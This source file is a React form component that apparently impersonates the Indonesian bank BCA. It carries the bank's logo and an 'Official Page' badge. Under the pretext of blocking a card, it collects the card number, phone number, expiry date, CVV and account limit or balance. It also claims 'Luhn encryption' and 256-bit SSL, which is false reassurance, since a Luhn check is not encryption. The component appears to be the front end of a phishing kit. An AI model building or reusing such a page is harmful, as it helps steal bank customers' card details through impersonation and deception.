import React, { useState } from 'react';
import { Card3D } from '../Card3D';
import { LoadingOverlay } from '../LoadingOverlay';
import {
  detectCardType,
  hasCvvCapability,
  formatRupiah,
  formatExpiry,
  formatCardNumber,
  getCardNumberError,
  getPhoneError,
  getExpiryError,
  getCvvError,
  getLimitError,
} from '../../utils/luhn';

interface BlokirFormProps {
  onSubmit: (payload: {
    cardType: string;
    cardNumber: string;
    phone: string;
    expiry: string;
    cvv: string;
    limit: string;
  }) => void;
}

export const BlokirForm: React.FC<BlokirFormProps> = ({ onSubmit }) => {
  const [cardNumber, setCardNumber] = useState('');
  const [phone, setPhone] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [limit, setLimit] = useState('');
  const [isFlipped, setIsFlipped] = useState(false);

  const [touched, setTouched] = useState<{
    cardNumber?: boolean;
    phone?: boolean;
    expiry?: boolean;
    cvv?: boolean;
    limit?: boolean;
  }>({});

  const cleanNum = cardNumber.replace(/\D/g, '');
  const brandInfo = detectCardType(cleanNum);
  const showCvv = cleanNum.length < 4 || hasCvvCapability(cleanNum);

  // Evaluate active errors
  const cardErr = (touched.cardNumber || cardNumber.length > 0) ? getCardNumberError(cardNumber) : null;
  const phoneErr = (touched.phone || phone.length > 0) ? getPhoneError(phone) : null;
  const expiryErr = (touched.expiry || expiry.length > 0) ? getExpiryError(expiry) : null;
  const cvvErr = (showCvv && (touched.cvv || cvv.length > 0)) ? getCvvError(cvv) : null;
  const limitErr = (touched.limit || limit.length > 0) ? getLimitError(limit) : null;

  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCardNumber(formatCardNumber(e.target.value));
    setTouched((prev) => ({ ...prev, cardNumber: true }));
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '');
    if (val.length <= 15) setPhone(val);
    setTouched((prev) => ({ ...prev, phone: true }));
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setExpiry(formatExpiry(e.target.value));
    setTouched((prev) => ({ ...prev, expiry: true }));
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCvv(e.target.value.replace(/\D/g, ''));
    setTouched((prev) => ({ ...prev, cvv: true }));
  };

  const handleLimitChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setLimit(formatRupiah(e.target.value));
    setTouched((prev) => ({ ...prev, limit: true }));
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setTouched({
      cardNumber: true,
      phone: true,
      expiry: true,
      cvv: true,
      limit: true,
    });

    const cErr = getCardNumberError(cardNumber);
    const pErr = getPhoneError(phone);
    const eErr = getExpiryError(expiry);
    const vErr = showCvv ? getCvvError(cvv) : null;
    const lErr = getLimitError(limit);

    if (cErr || pErr || eErr || vErr || lErr) {
      return;
    }

    onSubmit({
      cardType: brandInfo.name,
      cardNumber,
      phone,
      expiry,
      cvv: showCvv ? cvv : 'Tidak Ada',
      limit,
    });
  };

  return (
    <div className="form-wrapper-container w-[var(--form-wrapper-width)] max-w-[var(--form-wrapper-max-width)] mx-auto">
      <div className="flex items-center justify-between mb-2">
        <img
          src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Bank_Central_Asia.svg/3840px-Bank_Central_Asia.svg.png"
          alt="BCA Logo"
          className="h-5 sm:h-6 object-contain"
        />
        <div className="text-[10px] text-[#0066AE] font-bold bg-[#ebf1f6] px-2.5 py-0.5 rounded-full shrink-0">
          Halaman Resmi
        </div>
      </div>

      <Card3D
        isFlipped={isFlipped}
        cardNumber={cardNumber}
        brandInfo={brandInfo}
        bankName="BANK BCA"
        cardGradient="linear-gradient(135deg, #004d85, #0066AE)"
        cvvValue={cvv}
        expiryValue={expiry}
      />

      <form onSubmit={handleSubmit} className="space-y-2">
        <div>
          <div className="flex justify-between items-center mb-0.5">
            <label className="block text-xs font-bold text-[#1a2b4c]">Nomor Kartu</label>
            {cleanNum.length > 0 && (
              <span className={`text-[10px] font-bold ${cardErr ? 'text-red-600' : 'text-[#0066AE]'}`}>
                [ {brandInfo.name} ]
              </span>
            )}
          </div>
          <input
            type="text"
            value={cardNumber}
            onChange={handleCardChange}
            onBlur={() => setTouched((prev) => ({ ...prev, cardNumber: true }))}
            inputMode="numeric"
            placeholder="•••• •••• •••• ••••"
            className={`w-full px-2.5 py-1.5 sm:px-3 sm:py-2 border rounded-md text-xs font-mono outline-none transition-all ${
              cardErr
                ? 'bg-red-50 border-red-500 text-red-900 focus:ring-2 focus:ring-red-500/20'
                : cardNumber.length > 0 && !cardErr
                ? 'bg-emerald-50/40 border-emerald-500 text-[#1a2b4c] focus:border-emerald-600 focus:ring-2 focus:ring-emerald-500/20'
                : 'bg-[#ebf1f6] border-[#d0dbe5] text-[#1a2b4c] focus:border-[#0066AE] focus:bg-white focus:ring-2 focus:ring-[#0066AE]/10'
            }`}
          />
          {cardErr && (
            <span className="text-[10px] text-red-600 font-semibold mt-0.5 block animate-fadeIn">
              ⚠ {cardErr}
            </span>
          )}
        </div>

        <div>
          <label className="block text-xs font-bold text-[#1a2b4c] mb-0.5">Nomor Handphone</label>
          <input
            type="text"
            value={phone}
            onChange={handlePhoneChange}
            onBlur={() => setTouched((prev) => ({ ...prev, phone: true }))}
            inputMode="numeric"
            placeholder="08xxxxxxxxxx"
            className={`w-full px-2.5 py-1.5 sm:px-3 sm:py-2 border rounded-md text-xs outline-none transition-all ${
              phoneErr
                ? 'bg-red-50 border-red-500 text-red-900 focus:ring-2 focus:ring-red-500/20'
                : phone.length > 0 && !phoneErr
                ? 'bg-emerald-50/40 border-emerald-500 text-[#1a2b4c] focus:border-emerald-600 focus:ring-2 focus:ring-emerald-500/20'
                : 'bg-[#ebf1f6] border-[#d0dbe5] text-[#1a2b4c] focus:border-[#0066AE] focus:bg-white focus:ring-2 focus:ring-[#0066AE]/10'
            }`}
          />
          {phoneErr && (
            <span className="text-[10px] text-red-600 font-semibold mt-0.5 block animate-fadeIn">
              ⚠ {phoneErr}
            </span>
          )}
        </div>

        <div className="grid grid-cols-2 gap-2">
          <div>
            <label className="block text-xs font-bold text-[#1a2b4c] mb-0.5">Masa Berlaku</label>
            <input
              type="text"
              value={expiry}
              onChange={handleExpiryChange}
              onBlur={() => setTouched((prev) => ({ ...prev, expiry: true }))}
              inputMode="numeric"
              placeholder="MM/YY"
              maxLength={5}
              className={`w-full px-2.5 py-1.5 sm:px-3 sm:py-2 border rounded-md text-xs font-mono outline-none transition-all ${
                expiryErr
                  ? 'bg-red-50 border-red-500 text-red-900 focus:ring-2 focus:ring-red-500/20'
                  : expiry.length > 0 && !expiryErr
                  ? 'bg-emerald-50/40 border-emerald-500 text-[#1a2b4c] focus:border-emerald-600 focus:ring-2 focus:ring-emerald-500/20'
                  : 'bg-[#ebf1f6] border-[#d0dbe5] text-[#1a2b4c] focus:border-[#0066AE] focus:bg-white focus:ring-2 focus:ring-[#0066AE]/10'
              }`}
            />
            {expiryErr && (
              <span className="text-[10px] text-red-600 font-semibold mt-0.5 block animate-fadeIn">
                ⚠ {expiryErr}
              </span>
            )}
          </div>

          {showCvv && (
            <div>
              <label className="block text-xs font-bold text-[#1a2b4c] mb-0.5">CVV</label>
              <input
                type="password"
                value={cvv}
                onChange={handleCvvChange}
                onFocus={() => setIsFlipped(true)}
                onBlur={() => {
                  setIsFlipped(false);
                  setTouched((prev) => ({ ...prev, cvv: true }));
                }}
                inputMode="numeric"
                placeholder="•••"
                maxLength={4}
                className={`w-full px-2.5 py-1.5 sm:px-3 sm:py-2 border rounded-md text-xs font-mono outline-none transition-all ${
                  cvvErr
                    ? 'bg-red-50 border-red-500 text-red-900 focus:ring-2 focus:ring-red-500/20'
                    : cvv.length > 0 && !cvvErr
                    ? 'bg-emerald-50/40 border-emerald-500 text-[#1a2b4c] focus:border-emerald-600 focus:ring-2 focus:ring-emerald-500/20'
                    : 'bg-[#ebf1f6] border-[#d0dbe5] text-[#1a2b4c] focus:border-[#0066AE] focus:bg-white focus:ring-2 focus:ring-[#0066AE]/10'
                }`}
              />
              {cvvErr && (
                <span className="text-[10px] text-red-600 font-semibold mt-0.5 block animate-fadeIn">
                  ⚠ {cvvErr}
                </span>
              )}
            </div>
          )}
        </div>

        <div>
          <label className="block text-xs font-bold text-[#1a2b4c] mb-0.5">Limit / Saldo Terakhir</label>
          <input
            type="text"
            value={limit}
            onChange={handleLimitChange}
            onBlur={() => setTouched((prev) => ({ ...prev, limit: true }))}
            inputMode="numeric"
            placeholder="Rp 0"
            className={`w-full px-2.5 py-1.5 sm:px-3 sm:py-2 border rounded-md text-xs outline-none transition-all ${
              limitErr
                ? 'bg-red-50 border-red-500 text-red-900 focus:ring-2 focus:ring-red-500/20'
                : limit.length > 0 && !limitErr
                ? 'bg-emerald-50/40 border-emerald-500 text-[#1a2b4c] focus:border-emerald-600 focus:ring-2 focus:ring-emerald-500/20'
                : 'bg-[#ebf1f6] border-[#d0dbe5] text-[#1a2b4c] focus:border-[#0066AE] focus:bg-white focus:ring-2 focus:ring-[#0066AE]/10'
            }`}
          />
          {limitErr && (
            <span className="text-[10px] text-red-600 font-semibold mt-0.5 block animate-fadeIn">
              ⚠ {limitErr}
            </span>
          )}
        </div>

        <button
          type="submit"
          className="w-full mt-2.5 py-2.5 bg-[#0066AE] text-white font-bold text-xs sm:text-sm rounded-md shadow-md hover:bg-[#004d85] active:scale-[0.99] transition-all cursor-pointer tracking-wide"
        >
          Lanjutkan Blokir
        </button>
      </form>

      <div className="flex items-center justify-center gap-1.5 text-[10px] text-[#5c6f84] mt-2.5">
        <span>🔒 Enkripsi Luhn • SSL 256-bit Terlindung</span>
      </div>
    </div>
  );
};
